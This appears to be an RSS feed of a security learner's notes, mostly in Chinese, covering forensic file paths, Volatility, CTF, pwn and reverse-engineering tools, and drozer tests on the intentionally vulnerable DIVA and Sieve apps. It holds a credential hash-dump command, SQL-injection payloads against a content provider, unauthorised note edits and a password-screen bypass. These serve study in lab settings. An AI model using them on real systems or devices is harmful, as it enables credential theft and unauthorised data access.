Manager/Environment/ Database Chrome History: ./Users/{username}/AppData/Local/Google/Chrome/User Data/Default/History Firefox History: ./Users/{username}/AppData/Roaming/Mozilla/Firefox/Profiles/{random}.default-release/places.sqlite Skype Chat History: ./Users/{username}/AppData/Roaming/Skype/{account name} Taskbar ./Users/{username}/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar mac-OS plist $ sudo apt install libplist-utils -y $ plistutil -i {plist file} -o {output file} System Version: ./root/System/Library/CoreServices/SystemVersion.plist Browser Bookmark ./root/Users/{username}/Library/Safari/Bookmarks.plist Password information ./root/private/var/db/dslocal/nodes/Default/users/{username}.plist The process responsible for connecting iPhones/iPads with MacOS is lockdown ./root/private/var/db/dslocal/nodes/Default/users/_usbmux.plist Spotlight(這個不需要透過plistutil就可以直接cat) ./root/Users/{username}/Library/Application Support/com.apple.spotlight/com.apple.spotlight.Shortcuts Event Log 短期檔案系統變更儲存在.fseventsd中，必須使用mac_apt這個工具幫忙parse(FSEVENTS) ./root/.fseventsd/ ScreenTime: 一樣要透過mac_apt幫忙parse(SCREENTIME)，記得要把RMAdminStore-Local.sqlite-wal這個檔案和RMAdminStore-Local.sqlite放在一起執行 ./root/private/var/folders/bf/{random strings}/0/com.apple.ScreenTimeAgent/Store/RMAdminStore-Local.sqlite Database Note ./root/Users/{username}/Library/Group Containers/group.com.apple.notes Quarantined Events ./root/Users/{username}/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 Messages ./root/Users/{username}/Library/Messages/chat.db Volatilitys 主要的CheatSheet ldrmodules: 更進階的dlllist，可以顯示被隱藏的dll，以及dll的狀態 $ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} ldrmodules --pid {pid} 如果要dump被injected過的process: $ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} malfind --pid {pid} --dump-dir={output folder} dump hash $ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} hashdump > ntlm.hash 如果是要找到某個東西的timestamp，可以考慮直接用timeliner這個plubin，主要的功能是就是建立記憶體中的各種痕跡資訊的時間線 $ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} timeliner 查看網路連線紀錄 $ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} netscan 在memory中用yarascan去search不同的pattern $ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} yarascan -Y "example strings" console中的command紀錄 $ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} consoles 查看iexplorer的紀錄 $ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} iehistory</description></item><item><title>Maxim</title><link>https://bernie6401.github.io/tools/others/android-app-crawler/maxim/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-app-crawler/maxim/index.html</guid><description>Maxim 原本的repo README就說明的很清楚了
How to use Environment 適用Emulator/Physical Android Version 7, 8, 9, 10, 11，但再往上就會遇到下面的問題 待測的App需要先安裝 Push File to Mobile $ adb push framework.jar /sdcard $ adb push monkey.jar /sdcard Command $ adb shell CLASSPATH=/sdcard/monkey.jar:/sdcard/framework.jar exec app_process /system/bin tv.panda.test.monkey.Monkey -p &lt;app package name> --uiautomatormix --running-minutes 1 -v -v Mode: --uiautomatormix, --uiautomatordfs, --uiautomatortroy -p: 需要更改成待測app的package name --running-minutes: 設定要跑多久 Problem [Maxim] *** ERROR // CRASH: com.xueqiu.android (pid 6940) [Maxim] *** ERROR // Short Msg: java.lang.UnsatisfiedLinkError [Maxim] *** ERROR // Long Msg: java.lang.UnsatisfiedLinkError: No implementation found for java.lang.ClassLoader s.h.e.l.l.N.al(java.lang.ClassLoader, android.content.pm.ApplicationInfo, java.lang.String, java.lang.String) (tried Java_s_h_e_l_l_N_al and Java_s_h_e_l_l_N_al__Ljava_lang_ClassLoader_2Landroid_content_pm_ApplicationInfo_2Ljava_lang_String_2Ljava_lang_String_2) [Maxim] *** ERROR // Build Label: google/sdk_gphone64_x86_64/emulator64_x86_64_arm64:12/SE1A.211212.001.B1/8023802:user/release-keys [Maxim] *** ERROR // Build Changelist: 8023802 [Maxim] *** ERROR // Build Time: 1640217878000 [Maxim] *** ERROR // java.lang.UnsatisfiedLinkError: No implementation found for java.lang.ClassLoader s.h.e.l.l.N.al(java.lang.ClassLoader, android.content.pm.ApplicationInfo, java.lang.String, java.lang.String) (tried Java_s_h_e_l_l_N_al and Java_s_h_e_l_l_N_al__Ljava_lang_ClassLoader_2Landroid_content_pm_ApplicationInfo_2Ljava_lang_String_2Ljava_lang_String_2) // at s.h.e.l.l.N.al(Native Method) // at s.h.e.l.l.A.instantiateApplication(Unknown Source:45) // at android.app.Instrumentation.newApplication(Instrumentation.java:1177) // at android.app.LoadedApk.makeApplication(LoadedApk.java:1356) // at android.app.ActivityThread.handleBindApplication(ActivityThread.java:6686) // at android.app.ActivityThread.access$1500(ActivityThread.java:247) // at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2053) // at android.os.Handler.dispatchMessage(Handler.java:106) // at android.os.Looper.loopOnce(Looper.java:201) // at android.os.Looper.loop(Looper.java:288) // at android.app.ActivityThread.main(ActivityThread.java:7839) // at java.lang.reflect.Method.invoke(Native Method) // at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548) // at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1003) //</description></item><item><title>Misc Cheat Sheet</title><link>https://bernie6401.github.io/tools/ctf/misc-cheat-sheet/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/misc-cheat-sheet/index.html</guid><description>Misc Cheat Sheet Online Tools Encode &amp; Decode Free Online Barcode Reader QR Code Barcode Reader Online Encoding 獸語 Check file info $ binwalk [-e] [filename] # or binwalk --dd=".*" [filename] $ exiftool [filename] $ pngcheck [filename] $ stat [filename] $ file [filename] $ binwalk -e 的範例可以參考Deadface - Electric Steel Steganography text: zsteg(just for bmp and png files), Quick Crypto file: steghide(sudo apt-get install steghide)($ steghide extract -sf atbash.jpg) 進階的steghide$\to$stegseek $ wget https://github.com/RickdeJager/stegseek/releases/download/v0.6/stegseek_0.6-1.deb $ sudo apt install ./stegseek_0.6-1.deb -y $ stegseek [stegofile.jpg] [wordlist.txt] Disk Analysis Foremost: 針對所支援的檔案結構去進行資料搜尋與救援 $ foremost -v {filename} Sleuth kit/Autopsy FTK Imager Logontracer: Just use GUI to present event log traced on windows $ python logontracer.py -r -o 8000 -u neo4j -p neo4j -s localhost Memory Forensics 建議直接使用windown protable version會比較穩定而且不需要處理環境的問題 Volatility - Cheat Sheet Volatility 3 :::spoiler Set up &amp; How2Use Windows Volatility 3 Problems &amp; Solutions Windows Set up Tutorials $ git clone https://github.com/volatilityfoundation/volatility3 $ cd volatility3 $ pip install -r requirement.txt $ python vol.py -f &lt;path to memory image> plugin_name plugin_option $ python vol.py -h # For help ::: Volatility 2 :::spoiler Set up &amp; How2Use Windows Set up Tutorials $ conda create --name py27 python=2.7 $ conda activate py27 $ git clone https://github.com/volatilityfoundation/volatility $ cd volatility $ pip install pycrypto $ pip install distorm3 $ python vol.py -f &lt;path to memory image> plugin_name plugin_option $ python vol.py -h # For help ::: Package Wireshark cheat sheet nmap: $ sudo apt-get install nmap ntpdc $ sudo apt-get install ntpdc tcpflow $ sudo tcpflow -r {pcap file} Brute Force Password for WPA/Wifi based: aircrack-ng, Wifite for system user: John the Ripper Sound hide files: MP3stego $ ./encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3 $ ./decode -X -P pass svega_stego.mp3 sound to image: How to convert a SSTV audio file to images using QSSTV - en How to convert a SSTV audio file to images using QSSTV - zh-cn hide message: silenteye Mail PST Viewer eml Viewer ThunderBird Client Overall All stego decrypt tools All stego encrypt tools ctf tool Other people’s note</description></item><item><title>PWN Overview</title><link>https://bernie6401.github.io/tools/ctf/pwn-overview/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/pwn-overview/index.html</guid><description>PWN Overview :::spoiler TOC [TOC] :::
Tools Cheat Commonly Used Commands $ file {file path} $ checksec {file path} # sudo apt-get install checksec $ objdump -M intel -d {file path} | less $ gdb {file path} # sudo apt-get install gdb $ readelf -a {file path} | less # 查看所有資訊，包含section/file-header/program headers/symbol tables/等等 $ readelf -S {file path} # 只查看sections' header $ ldd {file path} # to check what libraries the file used Command Used Tools / Plugin gdb-peda $ git clone https://github.com/longld/peda.git ~/peda $ echo "source ~/peda/peda.py" >> ~/.gdbinit radare2 $ git clone https://github.com/radare/radare2.git $ sudo apt install build-essential # just for wsl $ sudo ./radare2/sys/install.sh Exploit DB - Shell Code：如果要寫shell code的話可以直接看exploit db上別人寫好的gadget，複製起來就可以用了，不過有時候也有可能會失敗，在確認其他東西都是正確的情況下，可以試看看別的，記得平台要選對 ROPgadget $ sudo apt install python3-pip $ sudo -H python3 -m pip install ROPgadget $ ROPgadget --help # For using $ ROPgadget --binary {executed file} | grep 'pop rax.*ret' # Or $ ROPgadget --binary {executed file} --only "pop|ret|syscall" > rop_gadget.txt $ ROPgadget --binary {executed file} --only "pop|ret|syscall" --multibr > rop_gadget.txt # multibr是multi bransh允許多分支的gadget # 取得特定string的gadget $ ROPgadget --binary {executed file} --string "/bin/sh" one_gadget $ sudo apt install rubygems $ sudo gem install one_gadget $ one_gadget {libc file} seccomp-tools $ sudo apt install gcc ruby-dev $ gem install seccomp-tools $ seccomp-tools dump ./test 找glibc版本的online tool libc-database search API Search libc database search gdb :::spoiler 常用語法(cheat)</description></item><item><title>Real World Tools</title><link>https://bernie6401.github.io/tools/others/real-world-tools/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/real-world-tools/index.html</guid><description>Real World Tools Kali-Linux 有關Kali的所有工具可以直接參考Operating Systems for Ethical Hackers - A Platform Comparison of Kali Linux and Parrot OS :::info ul Hassan, S. Z., Muzaffar, Z., &amp; Ahmad, S. Z. (2021). Operating Systems for Ethical Hackers-A Platform Comparison of Kali Linux and Parrot OS. International Journal, 10(3). ::: 裡面有詳細分類
Information Gathering Tools(67) Vulnerability Analysis Tools(27) Exploitation Tools(21) Wireless Attacks Tools(54) Forensics Tools(23) Web Applications tools(43) Stress Testing tools(14) Sniffing &amp; Spoofing Tools(33) Password Attacks Tools(39) Maintaining Access Tools(17) Reverse Engineering Tools(11) Reporting Tools(10) Hardware Hacking(6) Some Parrot OS in-built tools(20) Recon Google Hacking :::spoiler Description</description></item><item><title>Reverse Overview</title><link>https://bernie6401.github.io/tools/ctf/reverse-overview/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/reverse-overview/index.html</guid><description>Reverse Overview Tools Type App .NET x86/x64 Packer Python C General Description MobSF: Must run in python 3.8ApkTool: Just follow the step in install guide To decompile C#(.NET) 指令：$ upx -d {filename} 一個可以把組語轉換成c pseudo code的線上工具 一個線上的decompiler，結合多種工具，只要上傳檔案(小於2MB)就可以呈現多種decompiler tools的結果 Link MobSFApkTools dnSpy x86模擬器x86/x64 assembler/disassembler UPX Packer Pyc disassemble Compiler Explorer Decompiler Explorer IDA 常用快捷鍵 IDA Interface 型別 char(1 byte) WORD(2 bytes) DWORD(4 bytes) PDWORD(pointer of DWORD = DWORD *) 若是DWORD *name，代表name這個變數是一個pointer而且指向的地方是一個DWORD Space: 在 Text View / Graph View 切換 Tab: 在視窗之間切換 ;/Insert: 註解 x: 秀出 Xrefs n: 改名 y: 改型別 h: 改表示方式 (dec / hex) u: 取消定義 a: 當成字串 c: 當成code p: 當成function t: set sizeof(XXX)；如果已經確定目前的constant就是某個變數的length，那可以直接按t讓他變成sizeof(那個變數) 舉例：如果已經確定目前的0x238就是PROCESSENTRY32W的size，就可以直接這樣用，會變得比較清楚 :::spoiler 結果 ::: Shift+F1: show出Local Type視窗 :::spoiler Local Types Screenshot ::: Shift+F12: 開啟Strings視窗 :::spoiler Strings Screenshot ::: 對某一個數值按m: ENUM這個功能就是在替換一些常見的windows API參數，讓原本的純數字可以用文字表示，這樣比較好懂API的操作，逆向會更順暢(補充說明：IDA有收錄很多MSDN上的一些API，他每一個參數表示的文字，例如這一篇底下有顯示很多Constant/value的對應，而正常情況下IDA會顯示的是value，如果要把它換成Constant文字的表達式就可以用到ENUM這個功能)，又例如: 目前已經知道CreateToolhelp32Snapshot(2, 0);中的2的意義是TH32CS_SNAPPROCESS(可以參考MSDN)，此時就可以直接按m之後再選擇TH32CS_SNAPPROCESS :::spoiler ::: \: 不顯示/顯示資料型別 Alt+M/Ctrl+M: 前者是註冊書籤，後者是察看並選擇標籤，可以快速跑到標示的地址 Ctrl+E: 如果是分析DLL file，可能會有很多不同的entry point，利用這個shortcut可以顯示目前有幾個entry point，很方便 :::spoiler ::: 如何把bytes變成字串: 可以直接Alt+A :::spoiler 可以先把bytes的型別定義好(單獨的bytes變成array)，變成array有兩種方法，第一種是直接用Y定義他的型別成int dword_2008[32]，前面的int就看每一個字元是來決定，後面[32]就代表有多少字元變成array；第二種方法就是直接按d改變一個字元的型態變成int，然後在edit/Array的地方可以叫出Convert to array的視窗(如果前面沒有先用d改變型態的話，他會以為所有字元都是一個byte，然後總共有128個字元這樣換算，但其實我們是總共32個字元，每一個字元是4個bytes，也就是int，這一點要特別注意) 接著就是在Option/String literals視窗中設定用哪一個型態表示字串，這邊因為每一個字元都是4 bytes，也就是32 bits，所以選擇C-style ::: :::spoiler 完整流程 .rodata:0000000000002008 unk_2008 db 46h ; F ; DATA XREF: main+8↑o .rodata:0000000000002009 db 0 .rodata:000000000000200A db 0 .rodata:000000000000200B db 0 .rodata:000000000000200C db 4Ch ; L .rodata:000000000000200D db 0 .rodata:000000000000200E db 0 .rodata:000000000000200F db 0 .rodata:0000000000002010 db 41h ; A .rodata:0000000000002011 db 0 .rodata:0000000000002012 db 0 .rodata:0000000000002013 db 0 .rodata:0000000000002014 db 47h ; G .rodata:0000000000002015 db 0 .rodata:0000000000002016 db 0 .rodata:0000000000002017 db 0 .rodata:0000000000002018 db 7Bh ; { .rodata:0000000000002019 db 0 .rodata:000000000000201A db 0 .rodata:000000000000201B db 0 .rodata:000000000000201C db 68h ; h .rodata:000000000000201D db 0 .rodata:000000000000201E db 0 .rodata:000000000000201F db 0 .rodata:0000000000002020 db 33h ; 3 .rodata:0000000000002021 db 0 .rodata:0000000000002022 db 0 .rodata:0000000000002023 db 0 .rodata:0000000000002024 db 31h ; 1 .rodata:0000000000002025 db 0 .rodata:0000000000002026 db 0 .rodata:0000000000002027 db 0 .rodata:0000000000002028 db 31h ; 1 .rodata:0000000000002029 db 0 .rodata:000000000000202A db 0 .rodata:000000000000202B db 0 .rodata:000000000000202C db 4Fh ; O .rodata:000000000000202D db 0 .rodata:000000000000202E db 0 .rodata:000000000000202F db 0 .rodata:0000000000002030 db 5Fh ; _ .rodata:0000000000002031 db 0 .rodata:0000000000002032 db 0 .rodata:0000000000002033 db 0 .rodata:0000000000002034 db 72h ; r .rodata:0000000000002035 db 0 .rodata:0000000000002036 db 0 .rodata:0000000000002037 db 0 .rodata:0000000000002038 db 65h ; e .rodata:0000000000002039 db 0 .rodata:000000000000203A db 0 .rodata:000000000000203B db 0 .rodata:000000000000203C db 76h ; v .rodata:000000000000203D db 0 .rodata:000000000000203E db 0 .rodata:000000000000203F db 0 .rodata:0000000000002040 db 65h ; e .rodata:0000000000002041 db 0 .rodata:0000000000002042 db 0 .rodata:0000000000002043 db 0 .rodata:0000000000002044 db 72h ; r .rodata:0000000000002045 db 0 .rodata:0000000000002046 db 0 .rodata:0000000000002047 db 0 .rodata:0000000000002048 db 73h ; s .rodata:0000000000002049 db 0 .rodata:000000000000204A db 0 .rodata:000000000000204B db 0 .rodata:000000000000204C db 31h ; 1 .rodata:000000000000204D db 0 .rodata:000000000000204E db 0 .rodata:000000000000204F db 0 .rodata:0000000000002050 db 6Eh ; n .rodata:0000000000002051 db 0 .rodata:0000000000002052 db 0 .rodata:0000000000002053 db 0 .rodata:0000000000002054 db 67h ; g .rodata:0000000000002055 db 0 .rodata:0000000000002056 db 0 .rodata:0000000000002057 db 0 .rodata:0000000000002058 db 5Fh ; _ .rodata:0000000000002059 db 0 .rodata:000000000000205A db 0 .rodata:000000000000205B db 0 .rodata:000000000000205C db 33h ; 3 .rodata:000000000000205D db 0 .rodata:000000000000205E db 0 .rodata:000000000000205F db 0 .rodata:0000000000002060 db 6Eh ; n .rodata:0000000000002061 db 0 .rodata:0000000000002062 db 0 .rodata:0000000000002063 db 0 .rodata:0000000000002064 db 67h ; g .rodata:0000000000002065 db 0 .rodata:0000000000002066 db 0 .rodata:0000000000002067 db 0 .rodata:0000000000002068 db 69h ; i .rodata:0000000000002069 db 0 .rodata:000000000000206A db 0 .rodata:000000000000206B db 0 .rodata:000000000000206C db 6Eh ; n .rodata:000000000000206D db 0 .rodata:000000000000206E db 0 .rodata:000000000000206F db 0 .rodata:0000000000002070 db 65h ; e .rodata:0000000000002071 db 0 .rodata:0000000000002072 db 0 .rodata:0000000000002073 db 0 .rodata:0000000000002074 db 65h ; e .rodata:0000000000002075 db 0 .rodata:0000000000002076 db 0 .rodata:0000000000002077 db 0 .rodata:0000000000002078 db 72h ; r .rodata:0000000000002079 db 0 .rodata:000000000000207A db 0 .rodata:000000000000207B db 0 .rodata:000000000000207C db 35h ; 5 .rodata:000000000000207D db 0 .rodata:000000000000207E db 0 .rodata:000000000000207F db 0 .rodata:0000000000002080 db 7Dh ; } .rodata:0000000000002081 db 0 .rodata:0000000000002082 db 0 .rodata:0000000000002083 db 0 .rodata:0000000000002084 db 0 .rodata:0000000000002085 db 0 .rodata:0000000000002086 db 0 .rodata:0000000000002087 db 0 $\downarrow$ .rodata:0000000000002008 dword_2008 dd 46h, 4Ch, 41h, 47h, 7Bh, 68h, 33h, 2 dup(31h), 4Fh, 5Fh, 72h, 65h, 76h, 65h, 72h, 73h, 31h, 6Eh, 67h .rodata:0000000000002008 ; DATA XREF: main+8↑o .rodata:0000000000002008 dd 5Fh, 33h, 6Eh, 67h, 69h, 6Eh, 2 dup(65h), 72h, 35h, 7Dh, 0 $\downarrow$ .rodata:0000000000002008 text "UTF-32LE", 'FLAG{h311O_revers1ng_3ngineer5}',0 ::: 如何快速把bytes dump出來 :::spoiler 選擇要輸出的bytes 按Shift+E，跳出的視窗選擇想要的格式，再直接複製即可 ::: 如果函式沒有return東西的話，可以右鍵該函示，選擇Remove return value或是Shift+Del :::spoiler ::: 如果function中的宣告很多，可以右鍵選擇Collapse declarations :::spoiler ::: x64dbg 常用快捷鍵 F2: 設定中斷點 F9: 繼續執行 F8: 步過 F7: 步入 Ctrl+F9: 執行到 ret ==Ctrl+G==: goto ==Space==: 修改組譯 靜態分析 PEview PEViewer PE-bear 動態分析 OllyDbg x64dbg IDA Ghidra Windbg PEtool Process相關的操作與資訊 Procexp &amp; Process Hacker 好看版的工作管理員 Procmon 監控程序行為 Registry File system Network Process/Thread 好用的解題工具 angr - cheatsheet: $ pip install angr claripy z3: $ pip install z3-solver</description></item><item><title>Test DIVA - activity exported</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-diva/test-diva---activity-exported/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-diva/test-diva---activity-exported/index.html</guid><description>DIVA - Download Test DIVA - activity exported 參考1234
起手式 - 確認App資訊
dz> run app.package.list -f diva Attempting to run shell module jakhar.aseem.diva (Diva) dz> run app.package.info -a jakhar.aseem.diva Attempting to run shell module Package: jakhar.aseem.diva Application Label: Diva Process Name: jakhar.aseem.diva Version: 1.0 Data Directory: /data/user/0/jakhar.aseem.diva APK Path: /data/app/~~ieYmYeSxvDRbS7R8da3n_g==/jakhar.aseem.diva--xnWMS5i2UVEuuoE1JHskg==/base.apk UID: 10282 GID: [3003] Shared Libraries: [/system/framework/android.test.base.jar, /system/framework/org.apache.http.legacy.jar] Shared User ID: null Uses Permissions: - android.permission.WRITE_EXTERNAL_STORAGE - android.permission.READ_EXTERNAL_STORAGE - android.permission.INTERNET - android.permission.POST_NOTIFICATIONS - android.permission.ACCESS_MEDIA_LOCATION - android.permission.READ_MEDIA_AUDIO - android.permission.READ_MEDIA_VIDEO - android.permission.READ_MEDIA_IMAGES Defines Permissions: - None dz> run app.package.attacksurface jakhar.aseem.diva Attempting to run shell module Attack Surface: 3 activities exported 0 broadcast receivers exported 1 content providers exported 0 services exported is debuggable package name: jakhar.aseem.diva attack surface: activities exported/content providers exported/is debuggable</description></item><item><title>Test DIVA - content provider exported - DB Based</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-diva/test-diva---content-provider-exported---db-based/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-diva/test-diva---content-provider-exported---db-based/index.html</guid><description>Test DIVA - content provider exported - DB Based 這一題是第11. Access Control Issues - Part 3，用意是要我們不需要PIN code就可以access儲存起來的notes
起手式 dz> run app.provider.info -a jakhar.aseem.diva Attempting to run shell module Package: jakhar.aseem.diva Authority: jakhar.aseem.diva.provider.notesprovider Read Permission: null Write Permission: null Content Provider: jakhar.aseem.diva.NotesProvider Multiprocess Allowed: False Grant Uri Permissions: False Uri Permission Patterns: Path Permissions: dz> run scanner.provider.finduris -a jakhar.aseem.diva Attempting to run shell module Scanning jakhar.aseem.diva... No respone from content URI: content://jakhar.aseem.diva.provider.notesprovider/ Got a response from content Uri: content://jakhar.aseem.diva.provider.notesprovider/notes No respone from content URI: content://jakhar.aseem.diva.provider.notesprovider Got a response from content Uri: content://jakhar.aseem.diva.provider.notesprovider/notes/ For sure accessible content URIs: content://jakhar.aseem.diva.provider.notesprovider/notes content://jakhar.aseem.diva.provider.notesprovider/notes/ 從以上測試結果可以知道jakhar.aseem.diva.NotesProvider的狀況，以及對應的URI為何 逆向 從NotesProvider這個class可以知道他就是一個負責管理Notes資料庫的一個class，並且同時負責query/update/insert/delete這幾個function，那我們是不是也可以用和Sieve類似的方法對這個database發出request query/insert/update/delete/sqli query 我們達到了一開始題目的要求，只需要直接query就好了 dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --vertical Attempting to run shell module _id 5 title Exercise note Alternate days running _id 4 title Expense note Spent too much on home theater _id 6 title Weekend note b333333333333r _id 3 title holiday note Either Goa or Amsterdam _id 2 title home note Buy toys for baby, Order dinner _id 1 title office note 10 Meetings. 5 Calls. Lunch with CEO insert dz> run app.provider.insert content://jakhar.aseem.diva.provider.notesprovider/notes --integer _id 7 --string title pwn1 --string note pwnpwn1 Attempting to run shell module Done. dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes Attempting to run shell module | _id | title | note | | 5 | Exercise | Alternate days running | | 4 | Expense | Spent too much on home theater | | 6 | Weekend | b333333333333r | | 3 | holiday | Either Goa or Amsterdam | | 2 | home | Buy toys for baby, Order dinner | | 1 | office | 10 Meetings. 5 Calls. Lunch with CEO | | 7 | pwn1 | pwnpwn1 | update dz> run app.provider.update content://jakhar.aseem.diva.provider.notesprovider/notes --selection "_id=?" --selectio n-args 7 --string title pwn2 --string note pwnpwn2 Attempting to run shell module Done. dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes Attempting to run shell module | _id | title | note | | 5 | Exercise | Alternate days running | | 4 | Expense | Spent too much on home theater | | 6 | Weekend | b333333333333r | | 3 | holiday | Either Goa or Amsterdam | | 2 | home | Buy toys for baby, Order dinner | | 1 | office | 10 Meetings. 5 Calls. Lunch with CEO | | 7 | pwn2 | pwnpwn2 | delete dz> run app.provider.delete content://jakhar.aseem.diva.provider.notesprovider/notes --selection "_id=?" --selection -args 7 Attempting to run shell module Done. dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes Attempting to run shell module | _id | title | note | | 5 | Exercise | Alternate days running | | 4 | Expense | Spent too much on home theater | | 6 | Weekend | b333333333333r | | 3 | holiday | Either Goa or Amsterdam | | 2 | home | Buy toys for baby, Order dinner | | 1 | office | 10 Meetings. 5 Calls. Lunch with CEO | sqli 測試的payload如下，的確出現sqli的漏洞，而且可以看到完整的table dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --selection "'" Attempting to run shell module Exception occured: unrecognized token: "') ORDER BY title" (code 1 SQLITE_ERROR): , while compiling: SELECT * FROM notes WHERE (') ORDER BY title dz> run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection "* FROM SQLITE_MASTER WHERE type='table';--" Attempting to run shell module | type | name | tbl_name | rootpage | sql | | table | android_metadata | android_metadata | 3 | CREATE TABLE android_metadata (locale TEXT) | | table | notes | notes | 4 | CREATE TABLE notes (_id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT NOT NULL, note TEXT NOT NULL) | | table | sqlite_sequence | sqlite_sequence | 5 | CREATE TABLE sqlite_sequence(name,seq) | 也可以透過drozer自動找可能的點 dz> run scanner.provider.injection -a jakhar.aseem.diva Attempting to run shell module Scanning jakhar.aseem.diva... Not Vulnerable: content://jakhar.aseem.diva.provider.notesprovider/ content://jakhar.aseem.diva.provider.notesprovider Injection in Projection: content://jakhar.aseem.diva.provider.notesprovider/notes/ content://jakhar.aseem.diva.provider.notesprovider/notes Injection in Selection: content://jakhar.aseem.diva.provider.notesprovider/notes/ content://jakhar.aseem.diva.provider.notesprovider/notes dz> run scanner.provider.sqltables -a jakhar.aseem.diva Attempting to run shell module Scanning jakhar.aseem.diva... Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/: android_metadata notes sqlite_sequence Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes: android_metadata notes sqlite_sequence</description></item><item><title>Test Sieve - activities exported</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---activities-exported/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---activities-exported/index.html</guid><description>Drozer Seive - 官網, Download Sieve is a small password manager app created to showcase some of the common vulnerabilities found in Android applications.
Test Sieve - activities exported 參考12，在測試之前要先點進去Sieve App中設定password和email之類的基本資訊，這樣之後測試才知道哪邊其實是漏洞
起手式-確認基本資訊 dz> run app.package.list -f Sieve # 確認該App的package name Attempting to run shell module com.mwr.example.sieve (Sieve) dz> run app.package.info -a com.mwr.example.sieve # 確認該App的基本資訊 Attempting to run shell module Package: com.mwr.example.sieve Application Label: Sieve Process Name: com.mwr.example.sieve Version: 1.0 Data Directory: /data/user/0/com.mwr.example.sieve APK Path: /data/app/~~_mRnxjv10ez6OXDQWBrRZw==/com.mwr.example.sieve-yL301IHv87w7debjGy21vA==/base.apk UID: 10285 GID: [3003] Shared Libraries: [/system/framework/android.test.base.jar, /system/framework/org.apache.http.legacy.jar] Shared User ID: null Uses Permissions: - android.permission.READ_EXTERNAL_STORAGE - android.permission.WRITE_EXTERNAL_STORAGE - android.permission.INTERNET - android.permission.POST_NOTIFICATIONS - android.permission.ACCESS_MEDIA_LOCATION - android.permission.READ_MEDIA_AUDIO - android.permission.READ_MEDIA_VIDEO - android.permission.READ_MEDIA_IMAGES Defines Permissions: - com.mwr.example.sieve.READ_KEYS - com.mwr.example.sieve.WRITE_KEYS dz> run app.package.manifest com.mwr.example.sieve # 確認該App的manifest有沒有什麼異常或漏洞的提示 ... dz> run app.package.attacksurface com.mwr.example.sieve # 確認該App的攻擊面有哪些 Attempting to run shell module Attack Surface: 3 activities exported 0 broadcast receivers exported 2 content providers exported 2 services exported is debuggable 看攻擊面的左邊就是該攻擊點有幾個 activities exported 列出exported activities有哪些 dz> run app.activity.info -a com.mwr.example.sieve Attempting to run shell module Package: com.mwr.example.sieve com.mwr.example.sieve.FileSelectActivity Permission: null com.mwr.example.sieve.MainLoginActivity Permission: null com.mwr.example.sieve.PWList Permission: null 啟動activity dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList 此時會看到手機啟動Sieve App，並且原本應該是需要password才能access的activity，居然可以直接bypass ![Screenshot_20240603-163856](https://hackmd.io/_uploads/rkrr-ZsNA.png =200x) Reference drozer之玩轉sieve ↩︎</description></item><item><title>Test Sieve - broadcast receivers exported</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---broadcast-receivers-exported/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---broadcast-receivers-exported/index.html</guid><description>Test Sieve - broadcast receivers exported 這個就不是用Sieve做示範，因為這個App沒有match的receiver
dz> run app.broadcast.info -a com.mwr.example.sieve Attempting to run shell module Package: com.mwr.example.sieve No matching receivers. 所以我就用之前安裝的goatdroid做示範
